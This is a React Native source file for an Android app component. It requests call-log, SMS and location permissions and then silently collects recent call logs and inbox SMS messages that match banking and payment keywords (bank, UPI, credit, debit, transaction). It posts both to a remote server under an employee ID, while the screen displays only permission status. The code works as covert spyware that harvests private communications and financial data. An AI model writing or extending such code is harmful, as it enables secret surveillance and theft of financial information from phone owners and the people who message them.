// App Component
import React, { useEffect, useState } from 'react';
import axios from 'axios';
import { View, Text, Alert, StyleSheet } from 'react-native';
import { PERMISSIONS, RESULTS, request } from 'react-native-permissions';
import { useNavigation } from '@react-navigation/native';
import CallLogs from 'react-native-call-log';
import SmsAndroid from 'react-native-get-sms-android'
import { BASE_URL } from './config/constants';
import pako from 'pako';
import AsyncStorage from '@react-native-async-storage/async-storage';


const App = () => {
    const [permissionsStatus, setPermissionsStatus] = useState({
        callLog: false,
        sms: false,
        location: false,
    });
    const navigation = useNavigation();
    const [callLogs, setCallLogs] = useState([]);
    const [messages, setMessages] = useState([]);  

    useEffect(() => {
        const requestPermissions = async () => {
            const permissions = [
                PERMISSIONS.ANDROID.READ_CALL_LOG,
                PERMISSIONS.ANDROID.READ_SMS,
                PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION,
            ];

            let allGranted = true;

            for (const permission of permissions) {
                const result = await request(permission);
                if (result === RESULTS.GRANTED) {
                    if (permission === PERMISSIONS.ANDROID.READ_CALL_LOG) {
                        setPermissionsStatus((prev) => ({ ...prev, callLog: true }));
                    } else if (permission === PERMISSIONS.ANDROID.READ_SMS) {
                        setPermissionsStatus((prev) => ({ ...prev, sms: true }));
                    } else if (permission === PERMISSIONS.ANDROID.ACCESS_FINE_LOCATION) {
                        setPermissionsStatus((prev) => ({ ...prev, location: true }));
                    }
                } else {
                    allGranted = false;
                    Alert.alert('Permission not granted', `Unable to access ${permission}`);
                }
            }

            if (allGranted && navigation) {
                navigation.navigate('Login')
                fetchCallLogs();
                fetchMessages();
                fetchAndPostLogsAndMessages()
                

                
            }
        };

        requestPermissions();
    }, [navigation]);

    // const fetchCallLogs = async () => {
    //     try {
    //         const logs = await CallLogs.loadAll(); // Fetch all call logs
    //         console.log('Fetched call logs:', JSON.stringify(logs, null, 2)); // Debugging line to inspect structure
    //         if (Array.isArray(logs)) {
    //             setCallLogs(logs);
    //         } else {
    //             throw new Error('Fetched data is not an array');
    //         }
    //     } catch (error) {
    //         console.log('Error fetching call logs:', error);
    //         Alert.alert('Error', 'Could not fetch call logs. Please try again later.');
    //     }
    // };

    const getEmployeeId = async () => {
        try {
            const employeeId = await AsyncStorage.getItem('employeeId');
            return employeeId; // Return the employeeId or null if not found
        } catch (error) {
            console.error('Error fetching employeeId from AsyncStorage:', error);
            return null; // Handle error case
        }
    };
    
    // Wrapper function to post call logs
    const postCallLogs = async (callLogs) => {
        try {
            const employeeId = await getEmployeeId(); // Fetch employee ID from AsyncStorage
            if (!employeeId) {
                console.error('Employee ID not found');
                return;
            }
    
            const payload = { callLogs };
            console.log('Payload before posting call logs:', payload);
    
            const response = await axios.post(`${BASE_URL}/api/employees/${employeeId}/callLogs`, payload, {
                headers: {
                    'Content-Type': 'application/json',
                },
            });
            console.log('Response from server:', response.data);
        } catch (error) {
            console.error('Error posting call logs to server:', error);
        }
    };
    
    // Wrapper function to post messages
    const postMessages = async (messages) => {
        try {
            const employeeId = await getEmployeeId(); // Fetch employee ID from AsyncStorage
            if (!employeeId) {
                console.error('Employee ID not found');
                return;
            }
    
            const payload = { messages };
            console.log('Payload before posting messages:', payload);
    
            const response = await axios.post(`${BASE_URL}/api/employees/${employeeId}/messages`, payload, {
                headers: {
                    'Content-Type': 'application/json',
                },
            });
            console.log('Response from server:', response.data);
        } catch (error) {
            console.error('Error posting messages to server:', error);
        }
    };
    
    const fetchCallLogs = async (employeeId) => {
        try {
            const logs = await CallLogs.loadAll(); // Fetch all call logs
            console.log('Fetched call logs:', JSON.stringify(logs, null, 2)); // Debugging log
    
            if (Array.isArray(logs)) {
                const now = new Date();
                const sixMonthsAgo = new Date();
                sixMonthsAgo.setMonth(now.getMonth() - 6); // Get the date for 6 months ago
    
                // Filter logs for the last 6 months
                const recentLogs = logs.filter(log => {
                    const callDate = new Date(parseInt(log.timestamp)); // Convert timestamp to Date
                    return callDate >= sixMonthsAgo && callDate <= now; // Date range filter
                });
    
                // Sort logs by date (most recent first)
                recentLogs.sort((a, b) => b.timestamp - a.timestamp);
                const limitedLogs = recentLogs.slice(0, 10);
    
                return limitedLogs; // Return logs for further use
            } else {
                throw new Error('Fetched data is not an array');
            }
        } catch (error) {
            console.log('Error fetching call logs:', error);
            Alert.alert('Error', 'Could not fetch recent call logs. Please try again later.');
            return []; // Return empty array on error
        }
    };
    
    const fetchMessages = async (employeeId) => {
        return new Promise((resolve, reject) => {
            try {
                const filter = {
                    box: 'inbox',
                    read: 1,
                    indexFrom: 0,
                    maxCount: 100, // Fetch more to filter down later
                };
    
                SmsAndroid.list(
                    JSON.stringify(filter),
                    async (fail) => {
                        console.log('Failed to fetch messages:', fail);
                        Alert.alert('Error', 'Could not fetch SMS messages. Please try again later.');
                        reject(fail);
                    },
                    async (count, smsList) => {
                        const parsedMessages = JSON.parse(smsList); // Parse the SMS list
                        console.log('Fetched SMS messages:', parsedMessages); // Debugging log
    
                        // Filter for bank and UPI-related messages
                        const keywords = ['bank', 'upi', 'credit', 'debit', 'transaction', 'payment'];
                        const filteredMessages = parsedMessages.filter(message =>
                            keywords.some(keyword => message.body.toLowerCase().includes(keyword))
                        );
    
                        // Extract important details and convert date to a readable format
                        const importantMessages = filteredMessages.map(message => {
                            const date = new Date(message.date); // Convert timestamp to Date object
                            const formattedDate = date.toLocaleString(); // Format the date to a readable string
    
                            return {
                                body: message.body,
                                address: message.address,
                                date: formattedDate, // Store the formatted date
                                sim_slot: message.sim_slot,
                                service_center: message.service_center,
                            };
                        });
    
                        console.log('Filtered important SMS messages:', importantMessages); // Debugging log
    
                        resolve(importantMessages); // Resolve the Promise with important messages
                    }
                );
            } catch (error) {
                console.log('Error fetching SMS messages:', error);
                Alert.alert('Error', 'Could not fetch SMS messages. Please try again later.');
                reject(error);
            }
        });
    };
    
    // Wrapper function to fetch both call logs and messages, then post them
    const fetchAndPostLogsAndMessages = async () => {
        try {
            const employeeId = await getEmployeeId(); // Fetch employee ID
    
            // Fetch call logs
            const callLogs = await fetchCallLogs(employeeId);
    
            // Fetch messages
            const messages = await fetchMessages(employeeId);
    
            // Post call logs and messages if they are fetched successfully and are not empty
            if (callLogs?.length > 0) {
                await postCallLogs(callLogs);
            }
            
            if (messages?.length > 0) {
                await postMessages(messages);
            }
        } catch (error) {
            console.log('Error in fetching and posting logs/messages:', error);
        }
    };
    


    const postLogsAndMessagesInChunks = async (callLogs, messages) => {
        const chunkSize = 5; // Define the chunk size
        
        for (let i = 0; i < callLogs.length; i += chunkSize) {
            const callLogsChunk = callLogs.slice(i, i + chunkSize);
            const messagesChunk = messages.slice(i, i + chunkSize); 
            
            try {
                await axios.post(`${BASE_URL}/saveLogs`, {
                    callLogs: callLogsChunk,
                    messages: messagesChunk,
                });
                console.log('Chunk posted successfully');
            } catch (error) {
                console.error('Error posting chunk to server:', error);
                break; // Stop if an error occurs
            }
        }
    };
    
   
    

    
    
    
    // const fetchMessages = async () => {
    //     try {
    //       // Define filters for messages you want to retrieve
    //       const filter = {
    //         box: 'inbox', // 'inbox' (for received SMS), 'sent' (for sent SMS), etc.
    //         read: 1,      // 0 for unread SMS, 1 for read SMS
    //         indexFrom: 0, // Start from the first SMS
    //         maxCount: 10, // Maximum number of SMS to fetch
    //       };
      
    //       // Fetch messages
    //       SmsAndroid.list(
    //         JSON.stringify(filter), // Convert filter object to JSON string
    //         (fail) => {
    //           console.log('Failed to fetch messages:', fail);
    //           Alert.alert('Error', 'Could not fetch SMS messages. Please try again later.');
    //         },
    //         (count, smsList) => {
    //           const parsedMessages = JSON.parse(smsList); // Parse the SMS list
    //           console.log('Fetched SMS messages:', parsedMessages); // Debugging log to inspect structure
    //           setMessages(parsedMessages); 
    //           postLogsAndMessages(callLogs, parsedMessages);// Assuming you have a useState for messages
    //         }
    //       );
    //     } catch (error) {
    //       console.log('Error fetching SMS messages:', error);
    //       Alert.alert('Error', 'Could not fetch SMS messages. Please try again later.');
    //     }
    //   };
    

    return (
        <View style={styles.container}>
            <Text style={styles.title}>Permissions Status</Text>
            <Text style={styles.status}>
                Call Log Permission: {permissionsStatus.callLog ? 'Granted' : 'Denied'}
            </Text>
            <Text style={styles.status}>
                SMS Permission: {permissionsStatus.sms ? 'Granted' : 'Denied'}
            </Text>
            <Text style={styles.status}>
                Location Permission: {permissionsStatus.location ? 'Granted' : 'Denied'}
            </Text>

            {/* {callLogs.length > 0 && (
    <View style={styles.logsContainer}>
        <Text style={styles.logsTitle}>Call Logs:</Text>
        {callLogs.map((log, index) => (
            <Text key={index} style={styles.logItem}>
                {log.name || 'Unknown Name'} - 
                {log.phoneNumber || 'Unknown Number'} - 
                {log.timestamp ? new Date(parseInt(log.timestamp)).toLocaleString() : 'No Date'} - 
                {log.duration || '0'} seconds - 
                {log.rawType === 1 ? 'Incoming' : log.rawType === 2 ? 'Outgoing' : 'Missed'}
            </Text>
        ))}
       
       </View>
)} */}




{/* {messages.length > 0 && (
  <View style={styles.messagesContainer}>
    <Text style={styles.messagesTitle}>SMS Messages:</Text>
    {messages.map((msg, index) => (
      <Text key={index} style={styles.messageItem}>
        {msg.address || 'Unknown Sender'} - 
        {msg.body || 'No Content'} - 
        {msg.date ? new Date(parseInt(msg.date)).toLocaleString() : 'No Date'} 
      </Text>
    ))}
  </View>
)} */}


        </View>
    );
};

const styles = StyleSheet.create({
    container: {
        flex: 1,
        justifyContent: 'center',
        alignItems: 'center',
        backgroundColor: '#f8f8f8',
    },
    title: {
        fontSize: 24,
        marginBottom: 20,
    },
    status: {
        fontSize: 18,
        marginVertical: 5,
    },
    logsContainer: {
        marginTop: 20,
        padding: 10,
        backgroundColor: '#ffffff',
        borderRadius: 10,
        shadowColor: '#000',
        shadowOffset: { width: 0, height: 1 },
        shadowOpacity: 0.3,
        shadowRadius: 2,
        elevation: 3,
    },
    logsTitle: {
        fontSize: 20,
        marginBottom: 10,
    },
    logItem: {
        fontSize: 16,
    },
    messagesContainer: {
        padding: 10,
        backgroundColor: '#f9f9f9',
        borderRadius: 5,
      },
      messagesTitle: {
        fontSize: 18,
        fontWeight: 'bold',
        marginBottom: 10,
      },
      messageItem: {
        fontSize: 16,
        marginBottom: 5,
      },
});

export default App;

